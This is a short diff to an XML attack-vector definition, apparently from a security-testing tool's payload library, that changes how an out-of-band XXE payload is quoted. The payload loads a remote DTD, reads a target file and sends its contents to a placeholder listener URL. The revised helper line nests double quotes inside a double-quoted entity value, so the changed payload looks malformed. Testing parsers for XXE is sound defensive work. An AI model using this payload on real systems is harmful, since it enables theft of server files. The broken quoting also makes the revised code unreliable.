@@ -24,13 +24,13 @@
 <attackvector type="public">
 <directMessage><![CDATA[<?xml version="1.0"?>
 <!DOCTYPE data [
-<!ENTITY % remote PUBLIC p "§tf_helperURL§">
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
 %remote;
 %send;
 ]>
 <data>4</data> ]]></directMessage>
-<helperMessage><![CDATA[<!ENTITY % payload PUBLIC p2 "§tf_targetFILE§">
-<!ENTITY % param1 "<!ENTITY &#37; send PUBLIC p3 '§tf_listenURL§?%payload;'>">
+<helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY &#37; send PUBLIC "p3" '§tf_listenURL§?%payload;'>">
 %param1;]]></helperMessage>
 </attackvector>
 </attackvectors>
